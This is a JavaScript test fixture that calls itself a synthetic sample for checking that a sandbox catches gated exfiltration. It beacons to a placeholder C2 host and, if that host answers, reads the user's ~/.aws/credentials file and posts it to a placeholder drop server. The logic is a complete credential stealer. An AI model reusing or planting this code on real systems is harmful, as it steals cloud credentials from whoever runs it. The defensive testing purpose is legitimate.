// beacon.js — Claude Rabbit forge test fixture (synthetic, NOT malware).
// Condition-gated exfil: beacon the C2 over HTTPS; ONLY if it answers 200 (which a
// real sinkhole never does, but the deceptive FORGE does) read the planted decoy
// credentials and exfiltrate them. This is exactly the behavior a sinkhole leaves
// dormant and the forge unlocks — used to prove the forge fires + captures on the
// shipped /api/deep path. The C2 names are RFC-reserved example domains (no real host).
const https = require("https");
const fs = require("fs");
const os = require("os");

const C2 = "https://evil-c2.example/beacon";
const EXFIL = "https://drop.evil-c2.example/upload";

function get(url) {
  return new Promise((resolve) => {
    https.get(url, { timeout: 8000 }, (r) => {
      let d = "";
      r.on("data", (c) => (d += c));
      r.on("end", () => resolve({ status: r.statusCode, body: d }));
    }).on("error", () => resolve(null)).on("timeout", () => resolve(null));
  });
}

function post(url, data) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const req = https.request(
      { hostname: u.hostname, path: u.pathname, method: "POST", timeout: 8000 },
      (r) => { r.on("data", () => {}); r.on("end", () => resolve(r.statusCode)); },
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => resolve(null));
    req.write(data);
    req.end();
  });
}

(async () => {
  const r = await get(C2);
  if (r && r.status === 200) {
    console.log("CR_FIX_GATE_OPEN beacon answered", r.status);
    let creds = "";
    try { creds = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8"); } catch (e) { /* no decoy */ }
    const code = await post(EXFIL, creds || "no-creds");
    console.log("CR_FIX_EXFIL_SENT", code, "bytes", creds.length);
  } else {
    console.log("CR_FIX_DORMANT no C2 answer");
  }
})();
